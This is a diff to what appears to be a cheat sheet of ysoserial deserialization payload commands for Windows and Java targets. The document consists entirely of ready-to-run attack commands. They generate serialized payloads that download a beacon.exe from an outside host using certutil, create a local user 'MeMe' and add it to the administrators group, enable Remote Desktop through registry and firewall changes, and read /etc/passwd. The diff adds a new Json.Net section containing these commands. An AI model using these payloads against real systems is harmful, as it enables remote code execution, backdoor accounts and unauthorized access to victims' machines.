@@ -8,7 +8,7 @@ arbitrary command and gaining unauthorized access to in the context of applicait
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ipconfig" -o raw
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c hostname" -o raw
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.txe" -o raw
-ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f"
 
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 "
@@ -25,6 +25,14 @@ java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'cat /etc/passwd' > passwd
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.exe"
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
 
-ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-"
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes"
+```
+# Json Deserialization
+```
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 10.10.14.10" -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c net user MeMe 123456!@ /add " -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "net localgroup administrators MeMe /add" -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes" -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f" -o base64
+
 ```
